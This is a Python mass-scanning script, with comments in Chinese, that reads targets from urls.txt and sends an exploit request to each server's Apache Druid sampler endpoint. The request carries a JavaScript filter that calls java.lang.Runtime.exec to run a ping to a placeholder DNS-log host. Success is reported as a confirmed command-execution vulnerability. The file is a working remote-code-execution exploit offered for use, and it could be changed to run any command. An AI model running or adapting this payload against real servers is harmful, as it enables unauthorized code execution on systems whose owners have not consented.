# -*- coding: UTF-8 -*-
import requests
from urllib.parse import urlparse
from enum import Enum
import json


headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json",
    }

datas = {
    "type":"index",
    "spec":{
        "ioConfig":{
            "type":"index",
            "inputSource":{
                "type":"inline",
                "data":"{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
            },
            "inputFormat":{
                "type":"json",
                "keepNullColumns":True
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"timestamp",
                "format":"iso"
            },
            "dimensionsSpec":{

            },
            "transformSpec":{
                "transforms":[],
                "filter":{
                    "type":"javascript",
                    "dimension":"added",
                    "function":"function(value) {java.lang.Runtime.getRuntime().exec('ping xxx.dnslog.io')}",
                    "":{
                        "enabled":True
                    }
                }
            }
        },
        "type":"index",
        "tuningConfig":{
            "type":"index"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}

###
###字体颜色处理函数(windows cmd中无效)
###如打印红色文字
###print_color('Hello World', fg = Color.RED.value)
###未启用，需要使用请自行修改源码中print格式
###

class Color(Enum):
    BLACK = 30
    RED = 31
    GREEN = 32
    YELLOW = 33
    BLUE = 34
    MAGENTA = 35
    CYAN = 36
    WHITE = 37
def print_color(text: str, fg: Color = Color.BLACK.value):
    print(f'\033[{fg}m{text}\033[0m')

###
###url检测函数
###需根据情况自行构造，如检测漏洞页面是否存在等操作,windows cmd下建议注释print_color函数，自行修改输出
###check_url(url)
###


def check_url(url):
    print ("check_url: "+url)
    try:
        req=requests.post(url=url,headers=headers,data=json.dumps(datas),verify=False,timeout=10)
        if req.status_code == 200:
            print("[success]存在命令执行漏洞")
        else:
            print("[error]不存在命令执行漏洞")
    except Exception as e:
        print("[error]不存在文件上传漏洞")
        pass

###
###url处理函数
###从ip:port、http://ip:port、https://domain:port/path/xx.html等不同格式转化为 协议+ip/domain+port格式
###read_url
###


def read_url():
    f = open("urls.txt", 'r')
    for line in f.readlines():
        target = line.strip()
        #print(target)
        if "http" not in line:
            target="http://"+target
        target=urlparse(target.strip())
        #print(target)
        url = target.scheme+"://"+target.netloc+"/druid/indexer/v1/sampler"
        print(url)
        #拼接成需要的格式
        
        check_url(url)


def main():
    read_url()

main()